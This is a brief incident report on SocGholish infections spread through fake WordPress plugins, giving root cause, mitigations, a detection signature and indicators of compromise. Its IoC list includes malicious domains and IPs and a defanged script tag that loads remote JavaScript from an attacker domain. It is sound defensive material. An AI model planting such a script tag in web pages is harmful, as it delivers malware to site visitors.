# New Wave of SocGholish Infections Impersonates WordPress Plugins

Incident: SocGholish Infections Impersonates WordPress Plugins

Root cause: Compromised wp-admin credentials and unauthorized admin panel access.

Impact: 1,400 detections in Q4 2023, 2,800 scans in early 2024. The number of impacted websites is in the thousands, affecting potentially millions of visitors. Financial losses can include ransom payments, data recovery costs, and potential fines for data breaches.

Mitigation: 
1. Secure WordPress admin credentials:
    - Use strong, unique passwords.
    - Enable two-factor authentication (2FA).
    - Limit login attempts and monitor login activity.
2. Keep WordPress and all plugins/themes up-to-date:
    - Enable automatic updates whenever possible.
3. Employ a website firewall:
    - Implement Web Application Firewall (WAF) to block malicious traffic.
4. Regularly back up website data:
    - Use a reliable backup plugin or service.
5. Monitor for unauthorized changes and malware:
    - Use security plugins for real-time monitoring.
6. Verify plugin authenticity before installation:
    - Only download plugins from the official WordPress repository or trusted sources.

Detection Signature:
    Service: WordPress
    Port: 80/443
    Severity: Critical
    Incident: SocGholish Infections
    Signature name: “WordPress SocGholish malware injection”
    Internal checks:
        - Setting1: Check for unauthorized wp-admin logins.
        - Setting2: Verify the integrity of wp_postmeta table for script injections.
        - Setting3: Ensure plugins are from trusted sources and not modified.
    External scanning:
        - Port 80/443 open
        - Scan for known SocGholish script signatures in WordPress installations.

IoCs:
1. Domain: whitedrill[.]org
2. Domain: libertariancounterpoint[.]com
3. Domain: eeatgoodx[.]com
4. Domain: gitbrancher[.]com
5. Domain: funcallback[.]com
6. Domain: asyncfunctionapi[.]com
7. IP Address: 67.20.113.11
8. IP Address: 185.158.251.240
9. IP Address: 83.69.236.128
10. IP Address: 81.94.150.21
11. Malicious script example: `<script type="text/javascript" src="hxxps://eeatgoodx[.]com/gSyTvKB9"></script>`

No additional IoCs found.
